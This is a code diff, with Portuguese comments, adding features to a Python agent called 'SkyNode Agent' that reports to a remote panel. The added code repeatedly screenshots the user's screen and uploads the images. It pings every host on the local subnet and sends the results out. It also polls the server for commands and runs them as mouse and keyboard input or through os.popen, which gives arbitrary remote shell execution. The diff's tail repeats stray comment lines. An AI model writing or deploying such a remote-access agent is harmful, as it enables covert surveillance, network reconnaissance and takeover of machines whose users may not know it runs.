@@ -95,6 +95,52 @@ def obter_processos_ativos():
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
             pass
     return lista_processos
+# ==============================================================================
+# SCANNER DE DESCOBERTA ICMP (REDE LOCAL)
+# ==============================================================================
+ultimo_scan_rede = 0
+
+def realizar_varredura_icmp():
+    ip_local = get_local_ip()
+    if ip_local == "Indisponível":
+        return
+    
+    # Descobre os 3 primeiros octetos (ex: de 192.168.1.55 vira 192.168.1.)
+    base_ip = ".".join(ip_local.split(".")[:3]) + "."
+    print(f"🔍 Iniciando Varredura ICMP na rede local: {base_ip}0/24...")
+    
+    dispositivos_encontrados = []
+    
+    # Varre do IP 1 ao 254 (Ajuste o timeout baixo para ser rápido)
+    for i in range(1, 255):
+        ip_alvo = f"{base_ip}{i}"
+        
+        # Ignora o próprio IP do agente para não duplicar
+        if ip_alvo == ip_local:
+            continue
+            
+        try:
+            res = ping(ip_alvo, timeout=0.2) # Timeout curto para o laço correr rápido
+            if res is not None and res is not False:
+                dispositivos_encontrados.append({
+                    "ip": ip_alvo,
+                    "status": "online",
+                    "hostname": f"Dispositivo {i}" # Opcional: pode tentar socket.gethostbyaddr posterior
+                })
+        except Exception:
+            pass
+            
+    # Se achou alguém, despacha direto para a nova API do painel
+    if dispositivos_encontrados:
+        print(f"🟢 Varredura concluída! {len(dispositivos_encontrados)} dispositivos achados.")
+        payload = {
+            "agente_pai": HOSTNAME_GLOBAL,
+            "dispositivos": dispositivos_encontrados
+        }
+        try:
+            requests.post(f"{URL_BASE}/api/descoberta", json=payload, timeout=10)
+        except Exception as e:
+            print("❌ Erro ao enviar dados de descoberta para a Render:", e)
 
 # =========================================
 # LOOP PRINCIPAL (COMPATÍVEL COM A RENDER)
@@ -103,6 +149,9 @@ print(f"🚀 SkyNode Agent Iniciado apontando para: {URL_BASE}")
 
 # Armazena o relatório da última execução de comando para enviar ao painel
 ultimo_resultado = ""
+
+# Certifique-se de declarar essa variável logo ANTES do while True no seu arquivo:
+ultimo_scan_rede = 0
 
 while True:
     try:
@@ -131,6 +180,104 @@ while True:
             "public_ip": public_ip
         }
 
+        # -----------------------------------------
+        # 1. ENVIO DOS DADOS DE STATUS (MÁQUINA ONLINE)
+        # -----------------------------------------
+        try:
+            requests.post(f"{URL_BASE}/api/status", json=data, timeout=5)
+        except Exception as e:
+            print("❌ Erro ao sincronizar dados de status com o servidor:", e)
+
+        # -----------------------------------------
+        # 2. CAPTURA E ENVIO DE SCREENSHOT
+        # -----------------------------------------
+        screenshot_path = "temp_screen.jpg"
+        try:
+            with mss.mss() as sct:
+                monitor = sct.monitors[1]
+                screenshot = sct.grab(monitor)
+                img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
+                img = img.resize((1024, 576))
+                img.save(screenshot_path, "JPEG", quality=20, optimize=True)
+
+            with open(screenshot_path, "rb") as f:
+                arquivos = {'screenshot': f}
+                dados_form = {'hostname': HOSTNAME_GLOBAL}
+                requests.post(f"{URL_BASE}/api/screenshot", data=dados_form, files=arquivos, timeout=10)
+        except Exception as e:
+            print("❌ Erro ao enviar captura de tela:", e)
+        finally:
+            if os.path.exists(screenshot_path):
+                try:
+                    os.remove(screenshot_path)
+                except Exception:
+                    pass
+
+        # -----------------------------------------
+        # 3. VERIFICAÇÃO E EXECUÇÃO DE COMANDOS PENDENTES
+        # -----------------------------------------
+        command = ""
+        try:
+            cmd_data = {"hostname": HOSTNAME_GLOBAL, "result": ultimo_resultado}
+            response = requests.post(f"{URL_BASE}/api/command", json=cmd_data, timeout=10)
+            
+            ultimo_resultado = ""  # Limpa o resultado enviado
+            
+            if response.status_code == 200:
+                command = response.json().get("command", "").strip()
+        except Exception as e:
+            print("❌ Erro ao consultar fila de comandos do painel:", e)
+            command = ""
+
+        # Processamento das ações recebidas do painel
+        if command:
+            try:
+                if command.startswith("mouse_move"):
+                    _, x, y = command.split("|")
+                    pyautogui.moveTo(int(x), int(y))
+                    ultimo_resultado = "Mouse movido"
+                elif command == "mouse_click":
+                    pyautogui.click()
+                    ultimo_resultado = "Click executado"
+                elif command == "double_click":
+                    pyautogui.doubleClick()
+                    ultimo_resultado = "Duplo click"
+                elif command == "right_click":
+                    pyautogui.rightClick()
+                    ultimo_resultado = "Click direito"
+                elif command.startswith("keyboard"):
+                    _, text = command.split("|", 1)
+                    pyautogui.write(text, interval=0.03)
+                    ultimo_resultado = "Texto digitado"
+                elif command == "press_enter":
+                    pyautogui.press("enter")
+                    ultimo_resultado = "ENTER pressionado"
+                elif command == "press_backspace":
+                    pyautogui.press("backspace")
+                    ultimo_resultado = "BACKSPACE pressionado"
+                elif command == "get_processes":
+                    processos = obter_processos_ativos()
+                    ultimo_resultado = "PROCESS_LIST:" + json.dumps(processos)
+                else:
+                    ultimo_resultado = os.popen(command).read()
+                    if not ultimo_resultado.strip():
+                        ultimo_resultado = "Comando executado com sucesso."
+            except Exception as e:
+                ultimo_resultado = f"Erro ao executar comando: {str(e)}"
+
+    except Exception as e:
+        print("❌ ERRO INTERNO NO LOOP:", e)
+
+    # 💡 GATILHO TEMPORAL: Realiza o scan ICMP a cada 120 segundos (2 minutos)
+    if time.time() - ultimo_scan_rede > 120:
+        try:
+            realizar_varredura_icmp()
+        except Exception as e:
+            print("❌ Erro ao rodar varredura de rede:", e)
+        ultimo_scan_rede = time.time()
+
+    # Intervalo de consistência de 5 segundos
+    time.sleep(5)
         # -----------------------------------------
         # 1. ENVIO DOS DADOS DE STATUS (MÁQUINA ONLINE)
         # -----------------------------------------
